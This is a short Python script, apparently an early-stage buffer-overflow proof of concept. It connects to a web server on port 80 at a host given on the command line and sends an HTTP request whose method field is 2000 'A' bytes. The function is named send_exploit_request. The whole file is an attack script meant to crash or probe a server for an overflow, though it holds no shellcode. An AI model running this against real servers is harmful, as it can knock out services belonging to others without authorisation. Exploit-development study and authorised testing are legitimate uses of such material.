#!/usr/bin/python
import socket, sys

host = sys.argv[1]
port = 80


def send_exploit_request():

    buffer  = b"\x41" * 2000

    #HTTP Request
    request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    print(s.recv(1024))
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
